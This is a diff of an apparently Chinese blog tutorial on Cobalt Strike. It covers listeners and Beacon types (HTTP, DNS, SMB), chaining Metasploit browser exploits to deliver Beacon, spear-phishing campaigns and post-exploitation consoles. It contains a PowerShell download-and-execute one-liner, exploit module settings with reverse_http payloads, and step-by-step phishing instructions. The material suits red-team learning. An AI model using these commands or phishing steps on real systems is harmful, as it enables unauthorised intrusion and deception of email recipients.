-<p>作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。</p>
-<p>一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281027496.png"
+        title="image-20240228102749445" /></p>
+<p>Launch之后，会创建一个web服务，然后给出对应的命令，在目标上执行命令即可获得权限。</p>
+<p><strong>2、Signed Applet Attack</strong></p>
+<p>这是一个Java自签名的Applet的攻击，CS会启动一个Web服务以提供自签名的Java Applet的运行环境，浏览器会要求用户授予Applet运行权限。目标同意后，就会获取权限。（这种攻击方法目前已经基本处于过时状态。）</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281034002.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281034002.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281034002.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281034002.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281034002.png"
+        title="image-20240228103430946" /></p>
+<p>设置好listener之后，在目标侧访问给出的链接：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281035301.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281035301.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281035301.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281035301.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281035301.png"
+        title="image-20240228103540249" /></p>
+<p><strong>3、Smart Applet Attacks</strong></p>
+<p>智能化Applet攻击，会自动检测Java版本并利用已知的漏洞绕过安全沙箱，CS官方称该方法应过时，实战环境无效。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281044503.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281044503.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281044503.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281044503.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281044503.png"
+        title="image-20240228104430445" /></p>
+<h4 id="联动msf">联动MSF</h4>
+<p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p>
+<p>1、首先在MSF上选择攻击模块</p>
+<p>2、接着在MSF上设置Payload为<code>windows/meterpreter/reverse_http</code>或者<code>windows/meterpreter/reverse_https</code>，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。</p>
+<p>3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。</p>
+<p>4、然后设置 <code>DisablePayloadHandler</code> 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。</p>
+<p>5、再设置 <code>PrependMigrate</code> 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p>
+<p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行。</p>
+<p><strong>操作</strong></p>
+<p>在CS中新建一个HTTP Beacon，创建过程不再赘述。</p>
+<p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use exploit/multi/browser/adobe_flash_hacking_team_uaf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>2、接着配置payload，这里选择revese_http payload</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">// 操作系统/攻击载荷/传输器
-</span></span><span class="line"><span class="cl">Operating System/Payload/Stager
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">example:
-</span></span><span class="line"><span class="cl">windows/beacon_http/reverse_http
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_http</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">LHOST</span> <span class="n">cs_server_ip</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">LPORT</span> <span class="mi">80</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h4 id="stager">Stager</h4>
-<p>payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。</p>
-<p>stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。</p>
-<p>为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。</p>
-<h4 id="创建listener">创建Listener</h4>
-<p>在CS的client中打开Cobalt Strike -&gt; Listeners，之后点击下方的Add，弹出New Listener窗口：</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png"
-        title="image-20240222173802492" /></p>
-<p>CS的listener目前有三种类型：</p>
-<ul>
-<li>
-<p>Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">windows/beacon_http/reverse_http
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p>Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">windows/foregin/reverse_https
-</span></span></code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p>External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。</p>
-</li>
-</ul>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png"
-        title="image-20240222173926470" /></p>
-<h3 id="http和https-beacon">HTTP和HTTPS Beacon</h3>
-<p><strong>Beacon</strong></p>
-<ul>
-<li>Beacon是CS的Payload</li>
-<li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li>
-<li>通过HTTP、HTTPS和DNS出口网络</li>
-<li>使用SMB协议的时候是点对点通信</li>
-<li>Beacon有很多的后渗透攻击模块和远程管理工具</li>
-</ul>
-<p><strong>Beacon的类型</strong></p>
-<ul>
-<li>HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</li>
-</ul>
+</div><p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 True</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  windows/beacon_http/reverse_http
-</span></span><span class="line"><span class="cl">  windows/beacon_https/reverse_https
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">set</span> <span class="n">DisablePayloadHandler</span> <span class="n">True</span>
+</span></span><span class="line"><span class="cl"><span class="n">set</span> <span class="n">PrependMigrate</span> <span class="n">True</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>DNS Beacon</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  windows/beacon_dns/reverse_dns_txt
-</span></span><span class="line"><span class="cl">  windows/beacon_dns/reverse_http
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li>SMB Beacon SMB Beacon也可以叫做pipe beacon</li>
-</ul>
+</div><p>4、最后，开始攻击。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  windows/beacon_smb/bind_pipe
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>创建HTTP Beacon</strong></p>
-<p>点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png"
-        title="image-20240223110739474" /></p>
-<p>测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch:</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png"
-        title="image-20240223111429362" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png"
-        title="image-20240223110840913" /></p>
-<p>复制弹窗中的命令到靶机中执行：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-c</span> <span class="s2">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://172.16.86.138:80/test&#39;))&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exploit -j 
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281115902.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281115902.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281115902.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281115902.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png"
-        title="image-20240223111527176" /></p>
-<p>回到CS，靶机已经上线：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281115902.png"
+        title="image-20220213223714440" /></p>
+<h4 id="鱼叉钓鱼">鱼叉钓鱼</h4>
+<p>四个步骤：</p>
+<ol>
+<li>创建目标清单</li>
+<li>制作邮件模版或者使用现成模版</li>
+<li>选择邮件服务器</li>
+<li>发送邮件</li>
+</ol>
+<p><strong>标清单</strong></p>
+<p>目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。</p>
+<p>在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。</p>
+<p>这里使用一些在线邮件接收平台的邮箱地址作为示例。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">astrqb79501@chacuo.net    test1
+</span></span><span class="line"><span class="cl">gswtdm26180@chacuo.net    test2
+</span></span><span class="line"><span class="cl">ypmgin95416@chacuo.net    test3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将以上内容保存为txt文本文件，就创建好了自己的目标清单。</p>
+<p><strong>模板</strong></p>
+<p>使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。可以先在邮箱中找一封广告邮件，查看邮件原始信息，一般在邮件的选项里能找到这个功能，然后导出为<code>.eml</code>文件作为模板。</p>
+<p><strong>发送邮件</strong></p>
+<p>有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。</p>
+<p>在CS客户端中，点击<code>Attacks --&gt; Spear Phish</code>即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281143961.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281143961.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281143961.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281143961.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png"
-        title="image-20240223111606515" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png"
-        title="image-20240223111800363" /></p>
-<p><strong>HTTPS Beacon</strong></p>
-<p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。</p>
-<h3 id="dns-beacon">DNS Beacon</h3>
-<p>使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。</p>
-<p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p>
-<p>DNS Beacon的工作流程具体如下：</p>
-<p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png"
-        title="image-20240223161626900" /></p>
-<p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p>
-<p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p>
-<p><strong>域名配置</strong></p>
-<p>既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png"
-        title="image-20211202223623912" /></p>
-<p>配置完可以使用nslookup进行测试</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png"
-        title="image-20211202224423180" /></p>
-<p>CS中创建监听器时填写NS记录的域名：</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png"
-        title="image-20211202223356738" /></p>
-<p>靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png"
-        title="image-20211202225129950" /></p>
-<h3 id="smb-beacon">SMB Beacon</h3>
-<p>SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。</p>
-<p>因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png 2x"
-        data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281143961.png"
         title="img" /></p>
-<p><strong>SMB Beacon配置</strong></p>
-<p>首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可：</p>
+<p>所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。</p>
+<p>当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。</p>
+<h2 id="二后渗透">二、后渗透</h2>
+<h3 id="beacon管理">Beacon管理</h3>
+<p><strong>Beacon 控制台</strong></p>
+<p>在一个 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p>
+<p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281150692.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281150692.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281150692.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281150692.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png"
-        title="image-20240227191613502" /></p>
-<p>然后在初始beacon中迁移到smb beacon：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281150692.png"
+        title="image-20240228115003627" /></p>
+<p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154536.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154536.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154536.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154536.png 2x"
         data-sizes="auto"
-        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png"
-        title="image-20240227191819912" /></p>
-<p>迁移完成后：</p>
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281154536.png"
+        title="image-20240228115414456" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png"
-        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png 2x"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281153869.png"
